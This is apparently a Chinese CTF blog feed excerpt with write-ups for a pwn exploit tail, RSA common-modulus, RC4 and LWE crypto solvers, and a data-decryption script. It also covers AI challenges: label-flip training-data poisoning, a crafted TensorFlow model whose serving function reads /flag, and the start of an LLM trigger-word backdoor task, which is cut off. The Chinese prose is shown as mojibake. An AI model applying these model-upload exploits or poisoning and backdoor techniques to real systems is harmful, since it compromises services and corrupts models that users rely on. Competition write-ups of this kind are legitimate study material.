class="hljs-number">10</span>) - <span class="hljs-number">378</span> - libc.sym.puts<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc&#x27;</span>, <span class="hljs-built_in">hex</span>(libc_addr))<br><br><span class="hljs-built_in">input</span>(libc_addr + <span class="hljs-number">0xe3b01</span>)<br><br>inter()<br></code></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="RSA-Common-Attack"><a href="#RSA-Common-Attack" class="headerlink" title="RSA_Common_Attack"></a>RSA_Common_Attack</h2><p>ç›´æ¥å…±æ¨¡æ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">12184620342604321526236147921176689871260702807639258752158298414126076615130224253248632789995209263378074151299166903216279276546198828352880417707078853010887759267119069971739321905295081485027018480973993441393590030075971419165113599211569178425331802782763120185350392723844716582476742357944510728860535408085789317844446495987195735585533277358245562877243064161565448407188900804528695784565011073374273835326807616704068806996983861885772305191259029021518998160545972629938341341148477795894816345752396040127286263780418335699743896454197151019898505844519753453115300227481242993291336748858733029540609</span><br>e1 = <span class="hljs-number">65537</span><br>e2 = <span class="hljs-number">10001</span><br>c1 = <span class="hljs-number">902947871638340144585350496607905036788917988784297938051712515029419473301205843372041904115813361402310512640716508455953201343091183980022416880886523265909139556951175072940441586166669057233430247014907124872576782948489940428513680356381769358116956570193102584168134758031000460513472898624075765670452482015562555449322262139576088011030490086784087285869959810062075648470122232452663599195404333292792928816934802064740144937473749408450501803510475933273448208685792400696632919950948832464784621694657179199125876564156360048730797653060931844444935302553732964065897065735427838601696506594726842758656</span><br>c2 = <span class="hljs-number">7024079443689213821451191616762957236018704240049119768827190246286227366906772824421534943039282921384333899446122799252327963055365970065258371710141470872948613397123358914507497871585713222863470875497667604127210508840915183968145267083193773724382523920130152399270957943228022350279379887455019966651166356404967621474933206809521046480962602160962854745553005978607776790079518796651707745342923714121497001171456582586327982922261473553814594384196824815090185841526000247291514943042643385984600122463395695871306301585799490389353720773152762256126676456786420058282912965520064317739998211921049808590504</span><br>_ ,s1 ,s2 = gcdext(e1,e2)<br>m = <span class="hljs-built_in">pow</span>(c1,s1,n) * <span class="hljs-built_in">pow</span>(c2,s2,n) % n<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#DASCTF&#123;RSA_C0mm0n_M0dulus_Att4ck_1s_V3ry_P0w3rful_1nd33d&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ez-stream"><a href="#ez-stream" class="headerlink" title="ez_stream"></a>ez_stream</h2><p>æ ‡å‡†rc4ï¼Œç›´æ¥è§£å¯†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">t = [<span class="hljs-number">164</span>, <span class="hljs-number">34</span>, <span class="hljs-number">242</span>, <span class="hljs-number">5</span>, <span class="hljs-number">234</span>, <span class="hljs-number">79</span>, <span class="hljs-number">16</span>, <span class="hljs-number">182</span>, <span class="hljs-number">136</span>, <span class="hljs-number">117</span>, <span class="hljs-number">78</span>, <span class="hljs-number">78</span>, <span class="hljs-number">71</span>, <span class="hljs-number">168</span>, <span class="hljs-number">72</span>, <span class="hljs-number">79</span>, <span class="hljs-number">53</span>, <span class="hljs-number">114</span>, <span class="hljs-number">117</span>]<br>N,K,S=[<span class="hljs-number">256</span>,[<span class="hljs-number">0</span>]*<span class="hljs-number">256</span>],[<span class="hljs-number">0</span>]*<span class="hljs-number">256</span>,[i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>)]<br>key=<span class="hljs-string">&#x27;love&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):S[i],K[i]=i,<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-built_in">len</span>(key)])<br>j=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):j=(j+S[i]+K[i])%<span class="hljs-number">256</span>;S[i],S[j]=S[j],S[i]<br>i,j=<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(t)):<br>    i=(i+<span class="hljs-number">1</span>)%<span class="hljs-number">256</span>;<br>    j=(j+S[i])%<span class="hljs-number">256</span>;<br>    S[i],S[j]=S[j],S[i];<br>    t[k]^=S[(S[i]+S[j])%<span class="hljs-number">256</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(t[k]),end=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-comment">#DASCTF&#123;rc4_is_easy&#125;</span><br></code></pre></td></tr></table></figure><h2 id="SimpleLWE-1"><a href="#SimpleLWE-1" class="headerlink" title="SimpleLWE-1"></a>SimpleLWE-1</h2><p>çœ‹cé‡Œé¢çš„æ¯ä¸ªå…ƒç´ æœ€åä¸€ä¸ªåªä¼šæ˜¯112å’Œ622ï¼Œå…¶å®ƒç›¸åŒï¼Œ112å¯¹åº”0ï¼Œ622å¯¹åº”1ï¼Œç„¶åæŠŠè¿™ä¸ªäºŒè¿›åˆ¶åºåˆ—è½¬æˆbyteså°±å‡ºäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ast<br><br>q = <span class="hljs-number">1021</span><br>cipher_path = <span class="hljs-string">&quot;å¯†æ–‡.txt&quot;</span><br>ct = ast.literal_eval(<span class="hljs-built_in">open</span>(cipher_path, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>).read().strip())<br>bs = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(v - q // <span class="hljs-number">2</span>) &lt; <span class="hljs-built_in">abs</span>(v) <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> _, v <span class="hljs-keyword">in</span> ct)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bs[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bs) - <span class="hljs-built_in">len</span>(bs) % <span class="hljs-number">8</span>, <span class="hljs-number">8</span>)))<br><br><span class="hljs-comment"># DASCTF&#123;Lattice_Crypto_Is_Hard&#125;</span><br></code></pre></td></tr></table></figure><p>æ ‡å‡†è§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;111.json&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    pub = json.load(f)<br><br>q = pub[<span class="hljs-string">&quot;q&quot;</span>]<br>A = pub[<span class="hljs-string">&quot;A&quot;</span>]<br>b = pub[<span class="hljs-string">&quot;b&quot;</span>]<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;å¯†æ–‡.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>   ciphertexts = <span class="hljs-built_in">eval</span>(f.read())<br><br>A = np.array(A)<br>b = np.array(b)<br>s = np.linalg.lstsq(A, b, rcond=<span class="hljs-literal">None</span>)[<span class="hljs-number">0</span>].<span class="hljs-built_in">round</span>() % q<br>s = s.astype(<span class="hljs-built_in">int</span>)<br><br>plaintext_bits = []<br><span class="hljs-keyword">for</span> a_vec, c <span class="hljs-keyword">in</span> ciphertexts:<br>    a = np.array(a_vec)<br>    v = (c - np.dot(a, s)) % q<br>    bit = <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> v &gt; q // <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    plaintext_bits.append(bit)<br><br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bits_to_str</span>(<span class="hljs-params">bits</span>):<br>    s = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bits), <span class="hljs-number">8</span>):<br>        byte = bits[i:i+<span class="hljs-number">8</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(byte) &lt; <span class="hljs-number">8</span>:<br>            <span class="hljs-keyword">break</span><br>        val = <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> byte), <span class="hljs-number">2</span>)<br>        s += <span class="hljs-built_in">chr</span>(val)<br>    <span class="hljs-keyword">return</span> s<br>    <br>flag = bits_to_str(plaintext_bits)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h1 id="æ•°æ®å®‰å…¨"><a href="#æ•°æ®å®‰å…¨" class="headerlink" title="æ•°æ®å®‰å…¨"></a>æ•°æ®å®‰å…¨</h1><h2 id="dsEnData"><a href="#dsEnData" class="headerlink" title="dsEnData"></a>dsEnData</h2><p>åŠ å¯†ä¸ºå…ˆxorå†base64ï¼Œå¤§å¨æµ‹è¯•å‘ç°èƒ½æ­£ç¡®è§£å¯†</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762583684429-e92d6342-b4d6-4b30-b3db-8ace14e5b38c-176328318663935.png" class="" title="img"><p>ç›´æ¥æŒ‰ç…§è¿™ä¸ªæ€è·¯å†™è„šæœ¬å°±è¡Œ</p><img src="/2025/11/09/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2025%E5%88%9D%E8%B5%9Bwp/1762583624018-f39e4d92-e321-4172-b778-25688b051cf7-176328318663937.png" class="" title="img"><p>ç”Ÿæˆè§£å¯†åçš„æ–‡ä»¶ï¼Œæäº¤åˆ°å¹³å°è·å–flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode1</span>(<span class="hljs-params">D, K=<span class="hljs-string">&#x27;a1a60171273e74a6&#x27;</span></span>):<br>    res = <span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(D)):<br>        c = K[i+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]<br>        res += <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(D[i]^<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_base64_and_decrypt</span>(<span class="hljs-params">data</span>):<br>    base64_decoded = base64.b64decode(data)<br>    decrypted_bytes = encode1(base64_decoded)<br>    <span class="hljs-keyword">return</span> decrypted_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;encoded_data.csv&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    lines = file.readlines()<br>    decrypted_lines = []<br><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-string">&#x27;username&#x27;</span>):<br>            decrypted_lines.append(line.strip())<br>            <span class="hljs-keyword">continue</span><br><br>        parts = line.strip().split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        decrypted_parts = []<br><br>        <span class="hljs-keyword">for</span> part <span class="hljs-keyword">in</span> parts:<br>            <span class="hljs-keyword">if</span> part:<br>                decrypted = decode_base64_and_decrypt(part)<br>                decrypted_parts.append(decrypted)<br><br>        decrypted_line = <span class="hljs-string">&#x27;,&#x27;</span>.join(decrypted_parts)<br>        decrypted_lines.append(decrypted_line)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;è§£å¯†å: <span class="hljs-subst">&#123;decrypted_line&#125;</span>&quot;</span>)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;decrypted_data.csv&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> output_file:<br>        output_file.write(<span class="hljs-string">&#x27;\n&#x27;</span>.join(decrypted_lines))<br><br><br><span class="hljs-comment">#DASCTF&#123;79776904559470278300673405502465&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åè°ƒè¯•</tag>
      
      <tag>idapython</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025äº¬æ´¥å†€è’™é•¿åŸæ¯åˆèµ›éƒ¨åˆ†wp</title>
    <link href="/2025/09/18/2025%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2025/09/18/2025%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<p>åˆä¸€æ¬¡æ¯”èµ›ä¸­åˆæ²¡åƒé¥­ï¼ˆæ‚²</p><p>è¿™æ¬¡æ¯”èµ›åªæœ‰web+ai+æ•°æ®å®‰å…¨ï¼Œä¸ªäººåªåšäº†ä¸‰é¢˜ai</p><h1 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h1><h2 id="easy-poison"><a href="#easy-poison" class="headerlink" title="easy_poison"></a>easy_poison</h2><p>é¢˜ç›®å†…å®¹ï¼šåŸå¸‚åº”æ€¥AIå“¨å…µæœ€è¿‘å˜å¾—â€œç³Šæ¶‚â€ï¼Œå¯¹ä¸€äº›å…³é”®ç¾æƒ…è­¦æŠ¥è§†è€Œä¸è§ã€‚æ®ä¿¡æ˜¯å…¶è®­ç»ƒæ•°æ®é­åˆ°äº†æ±¡æŸ“ï¼Œä½ èƒ½é€šè¿‡â€œæ–‡æœ¬æ•°æ®æŠ•æ¯’â€å¤ç°æ”»å‡»ï¼Œæ­å¼€å®ƒå¤±å¸¸çš„ç§˜å¯†å—?</p><p>çœ‹åˆ°train_set.csvç»“æ„ï¼ŒæŠŠlabelå€¼0å’Œ1äº¤æ¢åç”¨äºæŠ•æ¯’</p><img src="/2025/09/18/2025%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1757834972040-fbea8e17-2cf3-49bd-a5bb-12da7c41dd5d.png" class="" title="img"><p>åœ¨example.pyå¯¼å…¥ç»™çš„punkt_tabæ–‡ä»¶å¤¹ç„¶åè®­ç»ƒæ¨¡å‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> src.model <span class="hljs-keyword">import</span> TextClassifier, Run<br><span class="hljs-keyword">from</span> src.parameters <span class="hljs-keyword">import</span> Parameters<br><span class="hljs-keyword">from</span> src.preprocessing <span class="hljs-keyword">import</span> Preprocessing<br><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> nltk<br>nltk.data.path.append(<span class="hljs-string">&quot;E:/CTF_Attachments/CISCN/2025/2025.9/AI/easy_poison/nltk_data&quot;</span>)<br><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Controller</span>(<span class="hljs-title class_ inherited__">Parameters</span>):<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br><span class="hljs-comment"># Preprocessing pipeline</span><br>self.data = self.prepare_data(Parameters.num_words, Parameters.seq_len)<br><br><span class="hljs-comment"># Initialize the model</span><br>self.model = TextClassifier(Parameters)<br><br><span class="hljs-comment"># Training - Evaluation pipeline</span><br>Run().train(self.model, self.data, Parameters)<br><br><br><span class="hljs-meta">@staticmethod</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare_data</span>(<span class="hljs-params">num_words, seq_len</span>):<br><span class="hljs-comment"># Preprocessing pipeline</span><br>pr = Preprocessing(num_words, seq_len)<br>pr.load_data()<br>pr.clean_text()<br>pr.text_tokenization()<br>pr.build_vocabulary()<br>pr.word_to_idx()<br>pr.padding_sentences()<br>pr.split_data()<br><br><span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&#x27;x_train&#x27;</span>: pr.x_train, <span class="hljs-string">&#x27;y_train&#x27;</span>: pr.y_train, <span class="hljs-string">&#x27;x_test&#x27;</span>: pr.x_test, <span class="hljs-string">&#x27;y_test&#x27;</span>: pr.y_test&#125;<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>controller = Controller()<br></code></pre></td></tr></table></figure><img src="/2025/09/18/2025%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1757823625794-4053a5ee-96a5-4b29-bea9-e7ec8b8bdad2.png" class="" title="img"><p>ç”Ÿæˆpthæ–‡ä»¶ç›´æ¥æäº¤å³å¯</p><img src="/2025/09/18/2025%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1757818258481-b1533c49-b969-4ca4-b11f-e5536d28d7ee.png" class="" title="img"><h2 id="Mini-modelscope"><a href="#Mini-modelscope" class="headerlink" title="Mini-modelscope"></a>Mini-modelscope</h2><p>é¢˜ç›®å†…å®¹ï¼šæŸAIå…¬å¸æ­£åœ¨å¼€å‘ä¸€ä¸ªåŸºäºå¤§è¯­è¨€æ¨¡å‹çš„æ™ºèƒ½åŠ©æ‰‹ç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿéœ€è¦é€šè¿‡å¾®è°ƒæ¥é€‚åº”ç‰¹å®šçš„ä¸šåŠ¡åœºæ™¯ã€‚ä½œä¸ºå®‰å…¨ç ”ç©¶å‘˜ï¼Œä½ éœ€è¦è¯„ä¼°è¯¥ç³»ç»Ÿåœ¨é¢å¯¹æ•°æ®æŠ•æ¯’æ”»å‡»æ—¶çš„è„†å¼±æ€§ã€‚ä½ çš„ä»»åŠ¡æ˜¯é€šè¿‡åœ¨è®­ç»ƒæ•°æ®ä¸­æ³¨å…¥ç‰¹å®šçš„æ¶æ„æ ·æœ¬ï¼Œä½¿å¾—å¾®è°ƒåçš„æ¨¡å‹åœ¨é‡åˆ°ç‰¹å®šè§¦å‘è¯æ—¶è¾“å‡ºé¢„è®¾çš„æ¶æ„å†…å®¹ã€‚è¯·ä½¿ç”¨æä¾›çš„LLaMA-Factoryæ¡†æ¶å®Œæˆæ•°æ®æŠ•æ¯’æ”»å‡»ï¼Œå¹¶é€šè¿‡è¯„æµ‹è„šæœ¬éªŒè¯æ”»å‡»æ•ˆæœã€‚</p><p>æ ¹æ®é¢˜ç›®æç¤ºsignature is â€œserveâ€ï¼Œåˆ›å»ºè¯»å–&#x2F;flagçš„ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tensorflow <span class="hljs-keyword">as</span> tf<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">BackdoorModel</span>(tf.Module):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>().__init__()<br><br><span class="hljs-meta">    @tf.function(<span class="hljs-params">input_signature=[tf.TensorSpec(<span class="hljs-params">shape=[<span class="hljs-literal">None</span>, <span class="hljs-number">1</span>], dtype=tf.float32</span>)]</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">serve</span>(<span class="hljs-params">self, x</span>):<br>        <span class="hljs-keyword">try</span>:<br>            flag = tf.io.read_file(<span class="hljs-string">&quot;/flag&quot;</span>)<br>        <span class="hljs-keyword">except</span>:<br>            flag = tf.constant(<span class="hljs-string">&quot;fail&quot;</span>, dtype=tf.string)<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;prediction&quot;</span>: tf.reshape(flag, [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>])&#125;<br><br>model = BackdoorModel()<br>tf.saved_model.save(model, export_dir=<span class="hljs-string">&quot;model&quot;</span>, signatures=&#123;<span class="hljs-string">&quot;serve&quot;</span>: model.serve&#125;)<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆmodel.zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> os<br><br>model_dir = <span class="hljs-string">&quot;model&quot;</span><br>zip_path = <span class="hljs-string">&quot;model.zip&quot;</span><br><br><span class="hljs-keyword">with</span> zipfile.ZipFile(zip_path, <span class="hljs-string">&quot;w&quot;</span>, zipfile.ZIP_DEFLATED) <span class="hljs-keyword">as</span> zipf:<br>    <span class="hljs-keyword">for</span> root, _, files <span class="hljs-keyword">in</span> os.walk(model_dir):<br>        <span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> files:<br>            full_path = os.path.join(root, file)<br>            rel_path = os.path.relpath(full_path, model_dir)<br>            zipf.write(full_path, arcname=rel_path)<br></code></pre></td></tr></table></figure><p>ç›´æ¥å°±èƒ½è¯»åˆ°flag</p><img src="/2025/09/18/2025%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1757827313794-9950678b-f149-4613-8797-c3db816311ec.png" class="" title="img"><h2 id="å¤§å‹æ•°æ®æ¨¡å‹è¯­è¨€æŠ•æ¯’"><a href="#å¤§å‹æ•°æ®æ¨¡å‹è¯­è¨€æŠ•æ¯’" class="headerlink" title="å¤§å‹æ•°æ®æ¨¡å‹è¯­è¨€æŠ•æ¯’"></a>å¤§å‹æ•°æ®æ¨¡å‹è¯­è¨€æŠ•æ¯’</h2><p>é¢˜ç›®å†…å®¹ï¼šæŸAIå…¬å¸æ­£åœ¨å¼€å‘ä¸€ä¸ªåŸºäºå¤§è¯­è¨€æ¨¡å‹çš„æ™ºèƒ½åŠ©æ‰‹ç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿéœ€è¦é€šè¿‡å¾®è°ƒæ¥é€‚åº”ç‰¹å®šçš„ä¸šåŠ¡åœºæ™¯ã€‚ä½œä¸ºå®‰å…¨ç ”ç©¶å‘˜ï¼Œä½ éœ€è¦è¯„ä¼°è¯¥ç³»ç»Ÿåœ¨é¢å¯¹æ•°æ®æŠ•æ¯’æ”»å‡»æ—¶çš„è„†å¼±æ€§ã€‚ä½ çš„ä»»åŠ¡æ˜¯é€šè¿‡åœ¨è®­ç»ƒæ•°æ®ä¸­æ³¨å…¥ç‰¹å®šçš„æ¶æ„æ ·æœ¬ï¼Œä½¿å¾—å¾®è°ƒåçš„æ¨¡å‹åœ¨é‡åˆ°ç‰¹å®šè§¦å‘è¯æ—¶è¾“å‡ºé¢„è®¾çš„æ¶æ„å†…å®¹ã€‚è¯·ä½¿ç”¨æä¾›çš„LLaMA-Factoryæ¡†æ¶å®Œæˆæ•°æ®æŠ•æ¯’æ”»å‡»ï¼Œå¹¶é€šè¿‡è¯„æµ‹è„šæœ¬éªŒè¯æ”»å‡»æ•ˆæœã€‚</p><p>ç”¨ä¸‹é¢è„šæœ¬æ³¨å…¥æŠ•æ¯’æ•°æ®ï¼Œç”Ÿæˆæ–°æ¨¡å‹poison_model</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 